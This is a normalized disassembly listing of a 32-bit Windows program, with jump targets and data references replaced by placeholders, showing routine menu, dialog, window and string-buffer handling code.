push 0x0
push [ esp + 0x10 ]
push 0xf1
push [ eax + 0x1c ]
call edi
mov ecx [ esp + 0xc ]
neg ecx
sbb ecx ecx
and ecx 0x8
or ch 0x4
push ecx
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ CheckMenuItem@IAT ]
jmp r-xdata
sub_41b73f
push esi
push edi
mov esi ecx
xor edi edi
xor ecx ecx
cmp [ esp + 0xc ] edi
mov eax [ esi ]
setne cl
push ecx
mov ecx esi
call [ eax + 0x4 ]
cmp [ esi + 0xc ] edi
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ esi + 0x10 ] edi
jne r-xdata
cmp [ rw-data ] edi
jne r-xdata
push [ rw-data ]
mov eax [ esi + 0xc ]
push edi
push 0x400
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ SetMenuItemBitmaps@IAT ]
call sub_4227d5
cmp [ rw-data ] edi
je r-xdata
sub_41b795
push esi
mov esi ecx
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov eax [ esi + 0x14 ]
push [ eax + 0x1c ]
call sub_4213ab
cmp [ esi + 0x10 ] 0x0
jne r-xdata
pop esi
retn 0x4
mov ecx [ esi + 0x8 ]
push edi
mov edi 0x400
push edi
push ecx
push [ eax + 0x4 ]
call [ GetMenuState@IAT ]
push [ esp + 0xc ]
and ax 0xf6fb
or eax edi
push [ esi + 0x4 ]
push eax
mov eax [ esi + 0xc ]
push [ esi + 0x8 ]
push [ eax + 0x4 ]
call [ ModifyMenuA@IAT ]
pop edi
jmp r-xdata
sub_41b806
push esi
push edi
mov edi [ esp + 0xc ]
mov eax esi
pop edi
pop esi
retn
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call eax
test eax eax
pop ecx
jne r-xdata
push edi
call sub_40bb22
mov esi eax
pop ecx
test esi esi
jne r-xdata
sub_41b83a
cmp [ esp + 0x8 ] 0x110
jne r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_41cbf2
push eax
push r--data
call sub_41f5b5
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ eax ]
mov ecx eax
call [ edx + 0xbc ]
jmp r-xdata
retn 0x10
sub_41b87a
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_41d493
test eax eax
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx esi
call sub_41e0a7
test eax eax
je r-xdata
pop edi
pop esi
retn 0x4
cmp [ edi + 0x4 ] 0x100
jne r-xdata
cmp [ eax + 0x50 ] 0x0
je r-xdata
push edi
mov ecx esi
call sub_41ebaa
mov eax [ edi + 0x8 ]
cmp eax 0x1b
je r-xdata
xor eax eax
jmp r-xdata
push 0xfffffff0
push [ edi ]
call [ GetWindowLongA@IAT ]
test al 0x4
je r-xdata
cmp eax 0x3
jne r-xdata
push r--data
push [ edi ]
call sub_42130b
test eax eax
je r-xdata
push 0x2
push [ esi + 0x1c ]
call [ GetDlgItem@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x2
push 0x111
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push eax
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
sub_41b913
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
push edi
push [ ebp + 0x14 ]
mov edi [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x10 ]
push edi
push ebx
call sub_41b487
test eax eax
jne r-xdata
push 0x1
pop eax
jmp r-xdata
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
test bh 0x80
je r-xdata
cmp edi 0xffffffff
jne r-xdata
xor eax eax
cmp ebx 0xf000
jae r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
push eax
call sub_41cbcb
test eax eax
je r-xdata
call sub_41ad89
test eax eax
je r-xdata
push [ ebp + 0x14 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x10 ]
push edi
push ebx
call [ edx + 0xc ]
test eax eax
jne r-xdata
push [ ebp + 0x14 ]
mov edx [ eax ]
mov ecx eax
push [ ebp + 0x10 ]
push edi
push ebx
call [ edx + 0xc ]
test eax eax
je r-xdata
sub_41b9b4
mov eax sub_425d30
call sub_40cc20
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
cmp [ esi + 0x1c ] 0x0
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_41d23d
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
call sub_41d3fb
sub_41b9f2
mov eax sub_425d4c
call sub_40cc20
sub esp 0x34
push ebx
push esi
xor ebx ebx
push edi
cmp [ ebp + 0x10 ] ebx
mov esi ecx
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x24 ] esi
jne r-xdata
call sub_422d64
mov edi [ eax + 0x1038 ]
push 0x10
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x4 ] ebx
call sub_41ee1c
push 0x3c000
call sub_41ee1c
cmp edi ebx
je r-xdata
call sub_422d64
mov eax [ eax + 0x8 ]
mov [ ebp + 0x10 ] eax
cmp [ ebp + 0x8 ] ebx
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx esi
call [ eax + 0xb4 ]
cmp eax ebx
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x1
push eax
lea eax [ ebp - 0x1c ]
push eax
mov [ ebp - 0x20 ] ebx
push [ ebp + 0x8 ]
call sub_41fb8a
add esp 0xc
xor ecx ecx
cmp eax ebx
sete cl
mov eax ecx
cmp eax ebx
jne r-xdata
push [ ebp + 0x8 ]
mov eax [ edi ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0x10 ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0xc
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x40 ]
call sub_41f9d9
push [ ebp - 0x20 ]
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x2
call sub_41fd13
lea ecx [ ebp - 0x40 ]
call sub_41fa76
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0x1
call sub_41fa68
cmp [ ebp - 0x14 ] ebx
je r-xdata
push 0x2a
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
or [ esi + 0x2c ] 0xffffffff
or [ esi + 0x24 ] 0x10
push esi
call sub_41d07d
mov eax [ ebp + 0xc ]
cmp eax ebx
jne r-xdata
push [ ebp - 0x14 ]
call [ GlobalLock@IAT ]
mov [ ebp + 0x8 ] eax
push r--data
push [ ebp - 0x1c ]
call sub_40cd7c
pop ecx
test eax eax
pop ecx
je r-xdata
mov eax [ eax + 0x1c ]
xor eax eax
jmp r-xdata
cmp [ ebp - 0x20 ] 0x8
jne r-xdata
push r--data
push [ ebp - 0x1c ]
call sub_40cd7c
pop ecx
test eax eax
pop ecx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp edi ebx
je r-xdata
push ebx
push sub_41b83a
push eax
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
call [ CreateDialogIndirectParamA@IAT ]
lea ecx [ ebp - 0x1c ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x4 ] bl
call sub_41c358
jmp r-xdata
mov [ ebp - 0x20 ] ebx
push r--data
push [ ebp - 0x1c ]
call sub_40cd7c
pop ecx
test eax eax
pop ecx
jne r-xdata
call sub_41d0c9
test eax eax
jne r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx edi
call [ eax + 0x14 ]
cmp [ ebp - 0x18 ] ebx
je r-xdata
cmp [ ebp - 0x18 ] ebx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xa4 ]
mov eax [ esi ]
push ebx
mov ecx esi
call [ eax + 0xb4 ]
cmp [ ebp - 0x14 ] ebx
je r-xdata
test [ esi + 0x24 ] 0x10
jne r-xdata
cmp [ ebp - 0x18 ] ebx
jne r-xdata
push [ ebp - 0x14 ]
call [ GlobalUnlock@IAT ]
push [ ebp - 0x14 ]
call [ GlobalFree@IAT ]
push [ ebp - 0x18 ]
call [ DestroyWindow@IAT ]
mov [ ebp - 0x18 ] ebx
push 0x1
pop eax
test [ esi + 0x24 ] 0x10
je r-xdata
sub_41bc2c
push esi
push edi
mov esi ecx
call sub_41c7aa
lea edi [ esi + 0x3c ]
push 0x20
push 0x0
push edi
mov [ esi ] r--data
call sub_40cc70
mov eax [ esp + 0x1c ]
add esp 0xc
mov [ esi + 0x50 ] eax
mov eax [ esp + 0xc ]
movzx ecx ax
mov [ edi ] eax
mov [ esi + 0x40 ] ecx
mov eax esi
pop edi
pop esi
retn 0x8
sub_41bc65
push esi
push edi
mov esi ecx
call sub_422d64
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
push 0x0
mov ecx eax
call sub_42197e
lea ecx [ esi + 0x54 ]
push ecx
push eax
call sub_421b24
push esi
mov edi eax
call sub_41d07d
mov eax edi
pop edi
pop esi
retn
mov eax [ eax + 0x1c ]
sub_41bc9f
push esi
mov esi ecx
call sub_41d0c9
mov ecx esi
call sub_41cc49
push [ esi + 0x54 ]
call [ IsWindow@IAT ]
test eax eax
je r-xdata
and [ esi + 0x54 ] 0x0
call sub_422d64
mov eax [ eax + 0x4 ]
pop esi
test eax eax
je r-xdata
push 0x1
push [ esi + 0x54 ]
call [ EnableWindow@IAT ]
retn
push 0x1
mov ecx eax
call sub_42197e
sub_41bce1
mov eax sub_425d58
call sub_40cc20
sub esp 0x18
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x10 ] esp
mov [ ebp - 0x1c ] esi
mov eax [ esi + 0x48 ]
mov edi [ esi + 0x44 ]
mov [ ebp - 0x18 ] eax
call sub_422d64
cmp [ esi + 0x40 ] 0x0
mov ebx [ eax + 0xc ]
je r-xdata
test edi edi
je r-xdata
call sub_422d64
mov ebx [ eax + 0xc ]
push 0x5
push [ esi + 0x40 ]
push ebx
call [ FindResourceA@IAT ]
push eax
push ebx
call [ LoadResource@IAT ]
mov edi eax
cmp [ ebp - 0x18 ] 0x0
jne r-xdata
push edi
call [ LockResource@IAT ]
mov [ ebp - 0x18 ] eax
mov ecx esi
call sub_41bc65
mov [ ebp - 0x14 ] eax
call sub_41d0c9
xor edi edi
cmp [ ebp - 0x14 ] edi
mov [ ebp - 0x20 ] edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
push esi
mov [ ebp - 0x4 ] edi
call sub_41d07d
push [ ebp - 0x14 ]
call sub_41cbcb
push ebx
push eax
push [ ebp - 0x18 ]
mov ecx esi
call sub_41b9f2
cmp eax edi
je r-xdata
push [ ebp - 0x14 ]
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x20 ] edi
je r-xdata
test [ esi + 0x24 ] 0x10
je r-xdata
push edi
push [ ebp - 0x14 ]
call [ EnableWindow@IAT ]
mov [ ebp - 0x20 ] 0x1
cmp [ ebp - 0x14 ] edi
je r-xdata
push 0x1
push [ ebp - 0x14 ]
call [ EnableWindow@IAT ]
cmp [ esi + 0x1c ] edi
je r-xdata
push 0x4
mov ecx esi
pop ebx
call sub_41f19d
test ah 0x1
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x58 ]
mov ecx esi
call sub_41bc9f
mov eax [ esi + 0x2c ]
call [ GetActiveWindow@IAT ]
cmp eax [ esi + 0x1c ]
jne r-xdata
push 0x97
push edi
push edi
push edi
push edi
push edi
mov ecx esi
call sub_41f283
jmp r-xdata
push ebx
mov ecx esi
call sub_41ebda
push 0x5
pop ebx
push [ ebp - 0x14 ]
call [ SetActiveWindow@IAT ]
sub_41be64
push esi
push edi
push [ esp + 0xc ]
mov esi ecx
mov edi [ esi ]
call sub_421253
push eax
mov ecx esi
call [ edi + 0xc0 ]
mov ecx esi
call sub_41cb32
pop edi
pop esi
retn 0x8
sub_41be88
push esi
mov esi ecx
push edi
mov eax [ esi ]
call [ eax + 0xcc ]
call sub_422d64
mov ecx [ eax + 0x1038 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_41cb32
mov edi eax
test edi edi
je r-xdata
mov eax [ esi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
test [ esi + 0x25 ] 0x1
je r-xdata
mov edx [ esi + 0x4c ]
test edx edx
je r-xdata
push 0x0
push 0x0
push [ esi + 0x1c ]
call [ GetNextDlgTabItem@IAT ]
push eax
call sub_41cbcb
test eax eax
je r-xdata
mov edx [ ecx ]
push eax
push [ esi + 0x40 ]
push esi
call [ edx + 0x20 ]
mov edi [ ecx ]
push eax
push edx
push esi
call [ edi + 0x1c ]
jmp r-xdata
mov ecx eax
call sub_41f33b
xor edi edi
push 0xffffffff
mov ecx esi
call sub_41be41
xor eax eax
jmp r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
retn 0x8
sub_41bf10
push ebp
mov ebp esp
push ecx
push ecx
push esi
push edi
call sub_422d64
xor edi edi
cmp [ eax + 0x4 ] edi
jne r-xdata
call sub_403ba6
cmp eax edi
mov esi 0xe146
je r-xdata
xor eax eax
jmp r-xdata
call sub_422d64
mov eax [ eax + 0x4 ]
lea ecx [ ebp - 0x8 ]
push ecx
push edi
mov edx [ eax ]
push edi
push esi
mov ecx eax
call [ edx + 0xc ]
mov edx [ eax ]
lea ecx [ ebp - 0x8 ]
push ecx
push edi
push edi
push esi
mov ecx eax
call [ edx + 0xc ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push 0x1
pop eax
jmp r-xdata
sub_41bf66
push esi
mov esi ecx
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
push [ esi + 0x40 ]
mov ecx esi
call sub_41ea88
push eax
call sub_41ead8
jmp r-xdata
push 0xffffffff
mov ecx esi
call sub_41be41
xor eax eax
pop esi
retn
push 0x0
mov ecx esi
call sub_41e817
test eax eax
jne r-xdata
test eax eax
je r-xdata
push 0xe146
mov ecx esi
call sub_41f140
mov esi eax
test esi esi
je r-xdata
push 0x1
pop eax
pop esi
retn
call sub_41bf10
neg eax
sbb eax eax
mov ecx esi
and eax 0x5
push eax
call sub_41f2d2
sub_41bfec
push esi
push edi
mov edi ecx
cmp [ edi + 0x40 ] 0x0
mov esi [ edi + 0x48 ]
mov eax [ edi + 0x44 ]
je r-xdata
test eax eax
je r-xdata
push ebx
call sub_422d64
mov ebx [ eax + 0xc ]
push 0x5
push [ edi + 0x40 ]
push ebx
call [ FindResourceA@IAT ]
push eax
push ebx
call [ LoadResource@IAT ]
pop ebx
push 0x1
test esi esi
pop eax
je r-xdata
push eax
call [ LockResource@IAT ]
mov esi eax
pop edi
pop esi
retn
cmp [ esi + 0x2 ] 0xffff
mov ecx [ esi ]
jne r-xdata
mov ax [ esi + 0xa ]
mov si [ esi + 0xc ]
mov ecx [ esi + 0xc ]
mov ax [ esi + 0x12 ]
mov si [ esi + 0x14 ]
jmp r-xdata
xor eax eax
test ax ax
jne r-xdata
test cx 0x1801
jne r-xdata
test si si
jne r-xdata
push 0x1
pop eax
jmp r-xdata
sub_41c07c
push esi
mov esi [ esp + 0xc ]
test esi esi
jne r-xdata
call sub_422d64
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx + 0x3c ]
test eax eax
je r-xdata
push 0x1
pop eax
jmp r-xdata
mov edx [ eax ]
push 0x1
push esi
mov ecx eax
call [ edx + 0x98 ]
xor eax eax
lea esi [ eax + 0x20000 ]
test esi esi
je r-xdata
pop esi
retn 0x8
sub_41c0cd
push esi
mov esi ecx
mov ecx [ esp + 0x8 ]
mov eax [ ecx ]
cmp [ eax - 0xc ] 0x0
jl r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
push [ ecx ]
mov ecx esi
call sub_41c49d
mov [ esi ] eax
add eax 0xfffffff4
push eax
call [ InterlockedIncrement@IAT ]
jmp r-xdata
mov eax esi
pop esi
retn 0x4
sub_41c1c5
push ebx
push esi
mov esi [ esp + 0xc ]
mov ebx ecx
test esi esi
jne r-xdata
push edi
push 0x40
pop edi
cmp esi edi
jg r-xdata
mov eax [ rw-data ]
mov [ ebx ] eax
jmp r-xdata
mov edi 0x80
cmp esi edi
jg r-xdata
mov ecx rw-data
pop esi
pop ebx
retn 0x4
mov edi 0x100
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
mov [ eax ] 0x1
and [ eax + esi + 0xc ] 0x0
mov [ eax + 0x4 ] esi
add eax 0xc
mov [ ebx ] eax
pop edi
mov edi 0x200
cmp esi edi
jg r-xdata
mov ecx rw-data
jmp r-xdata
call sub_40b6ce
mov [ eax + 0x8 ] edi
jmp r-xdata
lea eax [ esi + 0xd ]
push eax
call sub_41b806
pop ecx
mov [ eax + 0x8 ] esi
mov ecx rw-data
jmp r-xdata
sub_41c247
mov eax [ ecx + 0x8 ]
cmp eax 0x40
jne r-xdata
cmp eax 0x80
jne r-xdata
push ecx
mov ecx rw-data
cmp eax 0x100
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
cmp eax 0x200
push ecx
jne r-xdata
push ecx
mov ecx rw-data
jmp r-xdata
call sub_40b75d
retn
call sub_41b82f
pop ecx
retn
mov ecx rw-data
jmp r-xdata
sub_41c28f
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov eax [ rw-data ]
mov [ esi ] eax
mov ecx [ esi ]
sub ecx 0xc
call sub_41c247
sub_41c301
push esi
push edi
mov edi ecx
mov esi [ edi ]
cmp [ esi - 0xc ] 0x1
jle r-xdata
pop edi
pop esi
retn
call sub_41c28f
push [ esi - 0x8 ]
mov ecx edi
call sub_41c1c5
mov eax [ esi - 0x8 ]
inc eax
push eax
push esi
push [ edi ]
call sub_40ce30
add esp 0xc
sub_41c32f
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
jg r-xdata
mov ecx esi
call sub_41c28f
push edi
mov ecx esi
call sub_41c1c5
cmp edi [ eax - 0x4 ]
jle r-xdata
pop edi
pop esi
retn 0x4
sub_41c358
push esi
mov esi ecx
mov eax [ esi ]
lea ecx [ eax - 0xc ]
cmp ecx [ rw-data ]
je r-xdata
pop esi
retn
add eax 0xfffffff4
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jg r-xdata
mov ecx [ esi ]
sub ecx 0xc
call sub_41c247
sub_41c382
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
push edi
test ebx ebx
mov [ esi ] eax
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn 0x4
mov eax ebx
shr eax 0x10
test ax ax
jne r-xdata
push ebx
call [ lstrlenA@IAT ]
mov edi eax
test edi edi
je r-xdata
movzx eax bx
push eax
call sub_41f410
jmp r-xdata
push edi
mov ecx esi
call sub_41c1c5
push edi
push ebx
push [ esi ]
call sub_40ce30
add esp 0xc
sub_41c3d4
mov eax [ rw-data ]
push ebx
mov ebx [ esp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
mov [ esi ] eax
je r-xdata
xor eax eax
push ebx
call sub_40d3c3
pop ecx
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn 0x4
push edi
lea edi [ eax + eax ]
push edi
mov ecx esi
call sub_41c1c5
inc edi
push edi
push ebx
push [ esi ]
call sub_41c666
add esp 0xc
mov ecx esi
push 0xffffffff
call sub_41c61e
pop edi
test eax eax
je r-xdata
sub_41c420
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_41c32f
push edi
push [ esp + 0x14 ]
push [ esi ]
call sub_40ce30
mov eax [ esi ]
add esp 0xc
mov [ eax - 0x8 ] edi
mov eax [ esi ]
and [ eax + edi ] 0x0
pop edi
pop esi
retn 0x8
sub_41c44d
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
mov ecx [ esi ]
mov eax [ edi ]
cmp ecx eax
je r-xdata
mov eax esi
pop edi
pop esi
retn 0x4
cmp [ ecx - 0xc ] 0x0
jge r-xdata
cmp [ eax - 0xc ] 0x0
jge r-xdata
add ecx 0xfffffff4
cmp ecx [ rw-data ]
jne r-xdata
mov ecx esi
call sub_41c28f
mov eax [ edi ]
mov [ esi ] eax
add eax 0xfffffff4
push eax
call [ InterlockedIncrement@IAT ]
push eax
mov ecx esi
push [ eax - 0x8 ]
call sub_41c420
jmp r-xdata
sub_41c49d
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
test edi edi
jne r-xdata
push edi
call [ lstrlenA@IAT ]
xor eax eax
jmp r-xdata
push edi
push eax
mov ecx esi
call sub_41c420
mov eax esi
pop edi
pop esi
retn 0x4
sub_41c4c4
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
test ebx ebx
mov esi ecx
je r-xdata
xor eax eax
push ebx
call sub_40d3c3
pop ecx
jmp r-xdata
lea edi [ eax + eax ]
mov ecx esi
push edi
call sub_41c32f
inc edi
push edi
push ebx
push [ esi ]
call sub_41c666
add esp 0xc
mov ecx esi
push 0xffffffff
call sub_41c61e
mov eax esi
pop edi
pop esi
pop ebx
retn 0x4
sub_41c505
push ebx
mov ebx [ esp + 0x10 ]
push esi
push edi
mov edi [ esp + 0x10 ]
mov esi ecx
lea eax [ edi + ebx ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn 0x10
push eax
call sub_41c1c5
push edi
push [ esp + 0x18 ]
push [ esi ]
call sub_40ce30
mov eax [ esi ]
push ebx
push [ esp + 0x2c ]
add eax edi
push eax
call sub_40ce30
add esp 0x18
sub_41c543
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
test edi edi
mov esi ecx
je r-xdata
pop edi
pop esi
pop ebx
retn 0x8
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
lea ebx [ eax - 0xc ]
jg r-xdata
push [ esp + 0x14 ]
mov ecx esi
push edi
push eax
push [ eax - 0x8 ]
call sub_41c505
push ebx
call sub_41c2c0
mov ecx [ eax - 0x8 ]
lea edx [ ecx + edi ]
cmp edx [ eax - 0x4 ]
jg r-xdata
push edi
add ecx eax
push [ esp + 0x18 ]
push ecx
call sub_40ce30
mov eax [ esi ]
add esp 0xc
add [ eax - 0x8 ] edi
mov eax [ esi ]
mov ecx [ eax - 0x8 ]
and [ ecx + eax ] 0x0
jmp r-xdata
sub_41c5cf
push ebx
push esi
mov esi ecx
mov ecx [ esp + 0xc ]
mov eax [ esi ]
cmp [ eax - 0xc ] 0x1
lea ebx [ eax - 0xc ]
jg r-xdata
push edi
mov edi [ eax - 0x8 ]
cmp ecx edi
jge r-xdata
cmp ecx [ eax - 0x4 ]
jle r-xdata
push ecx
mov ecx esi
call sub_41c1c5
lea eax [ edi + 0x1 ]
push eax
lea eax [ ebx + 0xc ]
push eax
push [ esi ]
call sub_40ce30
mov eax [ esi ]
add esp 0xc
push ebx
mov [ eax - 0x8 ] edi
call sub_41c2c0
pop edi
mov ecx edi
mov eax [ esi ]
pop esi
pop ebx
retn 0x4
sub_41c61e
push esi
mov esi ecx
call sub_41c301
mov eax [ esp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi ]
mov [ ecx - 0x8 ] eax
mov ecx [ esi ]
pop esi
and [ ecx + eax ] 0x0
retn 0x4
push [ esi ]
call [ lstrlenA@IAT ]
sub_41c646
push esi
push edi
mov edi [ esp + 0xc ]
mov esi ecx
push edi
call sub_41c5cf
mov eax [ esi ]
mov [ eax - 0x8 ] edi
mov eax [ esi ]
and [ eax + edi ] 0x0
mov eax [ esi ]
pop edi
pop esi
retn 0x4
sub_41c666
push ebx
xor ebx ebx
cmp [ esp + 0x10 ] ebx
push esi
mov esi [ esp + 0xc ]
jne r-xdata
push ebx
push ebx
push [ esp + 0x1c ]
push esi
push 0xffffffff
push [ esp + 0x24 ]
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
jle r-xdata
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
mov [ eax + esi - 0x1 ] bl
xor eax eax
jmp r-xdata
sub_41c7aa
push esi
mov esi ecx
call sub_41b33b
push 0x20
lea eax [ esi + 0x1c ]
push 0x0
push eax
mov [ esi ] r--data
call sub_40cc70
add esp 0xc
mov eax esi
pop esi
retn
sub_41c7e8
push esi
push edi
mov esi ecx
call sub_41b33b
lea edi [ esi + 0x1c ]
push 0x20
push 0x0
push edi
mov [ esi ] r--data
call sub_40cc70
mov eax [ esp + 0x18 ]
add esp 0xc
mov [ edi ] eax
mov eax esi
pop edi
pop esi
retn 0x4
sub_41c814
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetWindowLongA@IAT ]
mov ecx [ ebp + 0x10 ]
not ecx
and ecx eax
or ecx [ ebp + 0x14 ]
cmp eax ecx
jne r-xdata
push ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ SetWindowLongA@IAT ]
mov eax [ ebp + 0x18 ]
xor ecx ecx
cmp eax ecx
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
pop eax
or al 0x17
push eax
push ecx
push ecx
push ecx
push ecx
push ecx
push [ ebp + 0x8 ]
call [ SetWindowPos@IAT ]
pop ebp
retn 0x14
sub_41c8ba
push ebp
mov ebp esp
sub esp 0x10
test [ ebp + 0x13 ] 0x10
push esi
jne r-xdata
pop esi
leave
retn 0xc
mov esi [ ebp + 0x8 ]
mov ecx esi
call sub_41f19d
test eax 0x50000000
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx [ ebp - 0x10 ]
jne r-xdata
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push eax
call sub_41cbcb
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xac ]
test eax eax
je r-xdata
mov ecx eax
call sub_41f2f9
test eax eax
jne r-xdata
push 0x0
mov ecx esi
call sub_41e8cf
sub_41c933
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov ecx esi
call sub_41f19d
test eax 0x40000000
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov ecx esi
call sub_41e07f
mov edi [ ebp + 0x10 ]
mov ebx eax
mov ecx edi
call sub_41e07f
cmp ebx eax
je r-xdata
mov eax [ esi + 0x1c ]
test edi edi
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
and [ ebp - 0x4 ] edi
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
push 0x36e
push [ ebx + 0x1c ]
call [ SendMessageA@IAT ]
sub_41c994
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xfffffffe
push esi
jne r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x201
je r-xdata
mov ecx [ ebp + 0x8 ]
call sub_41e07f
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] 0x207
je r-xdata
push [ eax + 0x1c ]
call [ GetLastActivePopup@IAT ]
push eax
call sub_41cbcb
mov esi eax
test esi esi
je r-xdata
cmp [ ebp + 0x10 ] 0x204
jne r-xdata
call [ GetForegroundWindow@IAT ]
push eax
call sub_41cbcb
cmp esi eax
je r-xdata
mov ecx esi
call sub_41f2f9
test eax eax
je r-xdata
push [ esi + 0x1c ]
call [ SetForegroundWindow@IAT ]
push 0x1
pop eax
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_41ca0a
mov eax sub_425e9c
call sub_40cc20
sub esp 0x34
push ebx
push esi
push edi
mov ecx rw-data
mov [ ebp - 0x10 ] esp
push sub_422741
call sub_423575
mov ebx eax
push 0x7
pop ecx
lea edi [ ebp - 0x40 ]
lea eax [ ebx + 0x34 ]
and [ ebp - 0x4 ] 0x0
mov esi eax
mov [ ebp - 0x14 ] ebx
[ edi ] [ esi ]
mov ecx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp + 0x14 ]
cmp esi 0x2
mov [ ebx + 0x3c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebx + 0x38 ] esi
mov [ ebx + 0x40 ] eax
jne r-xdata
and [ ebp + 0x8 ] 0x0
cmp esi 0x110
jne r-xdata
mov ecx [ edi + 0x34 ]
test ecx ecx
je r-xdata
push [ ebp + 0x18 ]
mov eax [ edi ]
mov ecx edi
push [ ebp + 0x14 ]
push esi
call [ eax + 0x98 ]
cmp esi 0x110
mov [ ebp + 0x18 ] eax
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x24 ]
push eax
push edi
call sub_41c897
mov eax [ ecx ]
